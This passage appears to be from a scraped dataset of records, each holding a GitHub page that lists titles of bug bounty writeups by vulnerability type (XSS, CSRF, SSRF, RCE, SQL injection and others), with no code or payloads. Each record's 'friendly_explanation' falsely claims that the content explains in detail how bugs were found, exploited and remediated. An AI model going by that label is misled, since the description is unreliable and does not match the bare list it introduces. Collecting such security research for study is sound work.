Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#remote-code-execution-rce", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#remote-code-execution-rce. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#maintainers", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#maintainers. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert 